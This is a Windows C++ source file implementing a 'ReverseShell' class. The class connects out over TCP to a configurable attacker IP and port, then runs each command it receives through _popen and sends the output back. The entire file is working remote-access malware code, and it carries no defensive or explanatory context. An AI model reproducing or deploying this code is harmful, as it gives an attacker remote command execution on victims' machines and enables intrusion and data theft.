#include "../include/network.hpp"
#include <iostream>
#include <vector>

namespace RemoteControl {
    ReverseShell::ReverseShell(const std::string& ip, int port) 
        : attacker_ip(ip), attacker_port(port), client_socket(INVALID_SOCKET) {}

    ReverseShell::~ReverseShell() {
        if (client_socket != INVALID_SOCKET) {
            closesocket(client_socket);
        }
        WSACleanup();
    }

    bool ReverseShell::connect_to_attacker() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;

        client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (client_socket == INVALID_SOCKET) return false;

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(attacker_port);
        inet_pton(AF_INET, attacker_ip.c_str(), &serverAddr.sin_addr);

        if (connect(client_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            return false;
        }

        std::cout << "[+] Connected to attacker at " << attacker_ip << ":" << attacker_port << "\n";
        return true;
    }

    void ReverseShell::execute_shell() {
        char buffer[1024];
        while (true) {
            // Receive command
            int bytesReceived = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived <= 0) break;

            buffer[bytesReceived] = '\0';
            std::string cmd(buffer);
            
            // Execute command and capture output
            std::string result;
            FILE* fp = _popen(cmd.c_str(), "r");
            if (fp) {
                char line[256];
                while (fgets(line, sizeof(line), fp) != NULL) {
                    result += line;
                }
                _pclose(fp);
            }

            if (result.empty()) result = "Command executed (no output).\n";
            send(client_socket, result.c_str(), result.length(), 0);
        }
    }

    void ReverseShell::send_message(const std::string& msg) {
        send(client_socket, msg.c_str(), msg.length(), 0);
    }
}
